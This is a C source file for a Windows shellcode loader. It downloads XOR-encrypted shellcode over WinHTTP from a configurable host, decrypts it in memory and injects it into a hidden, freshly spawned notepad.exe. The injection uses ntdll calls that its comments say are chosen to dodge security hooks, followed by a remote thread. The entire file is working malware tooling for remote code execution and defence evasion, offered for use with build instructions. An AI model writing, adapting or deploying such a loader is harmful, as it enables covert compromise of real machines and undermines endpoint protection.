/*
 * loader.c — WinHTTP shellcode loader
 *
 * Downloads XOR-encrypted shellcode from PayloadURL, decrypts it in-memory
 * with a 4-byte XOR key (XORKey, 8 hex chars), and executes via CreateThread.
 *
 * Build (Linux → Windows x64):
 *   x86_64-w64-mingw32-gcc loader.c -o loader.exe \
 *       -mwindows -O2 -s \
 *       -DPayloadURL=\"http://10.2.20.200:8080/x\" \
 *       -DXORKey=\"aabbccdd\" \
 *       -lwinhttp -lkernel32
 *
 * Override at compile time:
 *   -DPayloadURL="http://host:port/path"
 *   -DXORKey="deadbeef"   (exactly 8 hex chars = 4-byte key)
 */

#include <windows.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>

/* ── Compile-time constants (override with -D flags) ──────────────────────── */

#ifndef PayloadURL
#define PayloadURL "http://127.0.0.1:8080/payload"
#endif

#ifndef XORKey
#define XORKey "deadbeef"
#endif

/* ── Internal helpers ─────────────────────────────────────────────────────── */

/*
 * hex_to_byte — convert two ASCII hex digits to a byte value.
 * Returns 0 on invalid input.
 */
static unsigned char hex_to_byte(char hi, char lo) {
    unsigned char val = 0;
    if (hi >= '0' && hi <= '9') val = (hi - '0') << 4;
    else if (hi >= 'a' && hi <= 'f') val = (hi - 'a' + 10) << 4;
    else if (hi >= 'A' && hi <= 'F') val = (hi - 'A' + 10) << 4;
    if (lo >= '0' && lo <= '9') val |= (lo - '0');
    else if (lo >= 'a' && lo <= 'f') val |= (lo - 'a' + 10);
    else if (lo >= 'A' && lo <= 'F') val |= (lo - 'A' + 10);
    return val;
}

/*
 * parse_xor_key — decode the XORKey compile-time hex string into key[] and
 * returns the key length in bytes (0 on error).
 * Supports up to 32 bytes (64 hex chars); for our 4-byte default: 8 chars.
 */
static int parse_xor_key(const char *hex, unsigned char *out, int max_out) {
    int len = (int)strlen(hex);
    if (len < 2 || len % 2 != 0) return 0;
    int key_len = len / 2;
    if (key_len > max_out) key_len = max_out;
    for (int i = 0; i < key_len; i++) {
        out[i] = hex_to_byte(hex[2 * i], hex[2 * i + 1]);
    }
    return key_len;
}

/*
 * xor_decrypt — XOR buf[0..len-1] in-place with the repeating key.
 */
static void xor_decrypt(unsigned char *buf, SIZE_T len,
                        const unsigned char *key, int key_len) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= key[i % (SIZE_T)key_len];
    }
}

/* ── Download via WinHTTP ─────────────────────────────────────────────────── */

/*
 * download_payload — fetch URL using WinHTTP.
 * Allocates a heap buffer, fills it with the response body, and sets *out_len.
 * Returns NULL on any error; caller must VirtualFree(buf, 0, MEM_RELEASE).
 *
 * Supports http:// and https:// (scheme detected from URL).
 */
static unsigned char *download_payload(const char *url_str, SIZE_T *out_len) {
    *out_len = 0;

    /* --- parse URL into components (WinHttpCrackUrl requires wide strings) - */
    int wurl_len = MultiByteToWideChar(CP_ACP, 0, url_str, -1, NULL, 0);
    WCHAR *wurl = (WCHAR *)LocalAlloc(LMEM_FIXED, (SIZE_T)wurl_len * sizeof(WCHAR));
    if (!wurl) return NULL;
    MultiByteToWideChar(CP_ACP, 0, url_str, -1, wurl, wurl_len);

    URL_COMPONENTSW ucw;
    WCHAR wscheme[16] = {0};
    WCHAR whost[256]  = {0};
    WCHAR wpath[2048] = {0};
    ZeroMemory(&ucw, sizeof(ucw));
    ucw.dwStructSize      = sizeof(ucw);
    ucw.lpszScheme        = wscheme; ucw.dwSchemeLength   = (sizeof(wscheme) / sizeof(WCHAR)) - 1;
    ucw.lpszHostName      = whost;   ucw.dwHostNameLength = (sizeof(whost) / sizeof(WCHAR)) - 1;
    ucw.lpszUrlPath       = wpath;   ucw.dwUrlPathLength  = (sizeof(wpath) / sizeof(WCHAR)) - 1;

    if (!WinHttpCrackUrl(wurl, 0, 0, &ucw)) {
        LocalFree(wurl);
        return NULL;
    }

    INTERNET_PORT port = ucw.nPort;
    if (port == 0) {
        port = (ucw.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_DEFAULT_HTTPS_PORT
                                                       : INTERNET_DEFAULT_HTTP_PORT;
    }
    DWORD open_flags = (ucw.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;

    /* --- WinHTTP session --------------------------------------------------- */
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) { LocalFree(wurl); return NULL; }

    HINTERNET hConnect = WinHttpConnect(hSession, whost, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); LocalFree(wurl); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        wpath[0] ? wpath : L"/",
        NULL,                         /* HTTP/1.1 */
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        open_flags);
    LocalFree(wurl);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    if (!WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA,   0,
            0, 0)) {
        goto cleanup;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    /* --- pre-allocate using Content-Length when available ------------------- */
    DWORD contentLen = 0;
    {
        WCHAR clbuf[32];
        DWORD clbufLen = sizeof(clbuf);
        if (WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX,
                clbuf, &clbufLen, WINHTTP_NO_HEADER_INDEX))
            contentLen = (DWORD)wcstoul(clbuf, NULL, 10);
    }

    /* --- read response body (VirtualAlloc avoids LMEM_MOVEABLE handle mis-use) */
    unsigned char *body    = NULL;
    SIZE_T         body_cap = 0;
    SIZE_T         body_sz  = 0;

    if (contentLen > 0) {
        body = (unsigned char *)VirtualAlloc(NULL, contentLen + 4096,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        body_cap = contentLen + 4096;
    }

    DWORD avail = 0;
    DWORD nread = 0;
    do {
        avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (avail == 0) break;

        if (body == NULL || body_sz + avail > body_cap) {
            SIZE_T new_cap = (body_sz + avail + 65536 + 0xFFFF) & ~(SIZE_T)0xFFFF;
            unsigned char *new_body = (unsigned char *)VirtualAlloc(NULL, new_cap,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!new_body) {
                if (body) VirtualFree(body, 0, MEM_RELEASE);
                body = NULL;
                break;
            }
            if (body && body_sz) memcpy(new_body, body, body_sz);
            if (body) VirtualFree(body, 0, MEM_RELEASE);
            body     = new_body;
            body_cap = new_cap;
        }

        nread = 0;
        if (!WinHttpReadData(hRequest, body + body_sz, avail, &nread)) {
            VirtualFree(body, 0, MEM_RELEASE);
            body = NULL;
            break;
        }
        body_sz += nread;
    } while (avail > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (body && body_sz > 0) {
        *out_len = body_sz;
        return body;
    }
    if (body) VirtualFree(body, 0, MEM_RELEASE);
    return NULL;

cleanup:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
}

/* ── ntdll function typedefs for process injection ───────────────────────── */

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE, PVOID, BOOLEAN, ULONG, PSIZE_T, PSIZE_T,
    PVOID, PVOID, PHANDLE, PVOID);

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShow;

    /* 1. Decode the compile-time XOR key */
    unsigned char xor_key[32];
    int key_len = parse_xor_key(XORKey, xor_key, (int)sizeof(xor_key));
    if (key_len == 0) return 1;

    /* 2. Download encrypted shellcode */
    SIZE_T sc_len = 0;
    unsigned char *sc = download_payload(PayloadURL, &sc_len);
    if (!sc || sc_len == 0) return 1;

    /* 3. XOR decrypt in-place */
    xor_decrypt(sc, sc_len, xor_key, key_len);

    /* 4. Spawn sacrificial process (breakaway from WinRM/job objects) */
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    BOOL ok = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | 0x01000000 /* CREATE_BREAKAWAY_FROM_JOB */,
        NULL, NULL, &si, &pi);
    if (!ok) {
        /* retry without breakaway if the job object forbids it */
        ok = CreateProcessA("C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    if (!ok) { VirtualFree(sc, 0, MEM_RELEASE); return 1; }
    Sleep(500);

    /* 5. Resolve ntdll functions (avoids kernel32 VirtualAllocEx/WriteProcessMemory hooks) */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1; }
    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory    NtWrite = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory  NtProt  = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pRtlCreateUserThread     RtlSpawn = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
    if (!NtAlloc || !NtWrite || !NtProt || !RtlSpawn) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1;
    }

    /* 6. Allocate RW in remote process, write shellcode, flip to RX */
    PVOID  addr = NULL;
    SIZE_T sz   = sc_len;
    NtAlloc(pi.hProcess, &addr, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(sc, 0, MEM_RELEASE); return 1; }

    ULONG wb = 0;
    NtWrite(pi.hProcess, addr, sc, (ULONG)sc_len, &wb);
    VirtualFree(sc, 0, MEM_RELEASE);

    ULONG old_prot = 0;
    /* sz is now page-aligned from NtAlloc — use it directly for NtProt */
    NtProt(pi.hProcess, &addr, &sz, PAGE_EXECUTE_READ, &old_prot);

    /* 7. Create remote thread — agent runs independently in notepad.exe */
    HANDLE hThread = NULL;
    RtlSpawn(pi.hProcess, NULL, FALSE, 0, NULL, NULL, addr, NULL, &hThread, NULL);
    if (hThread) CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
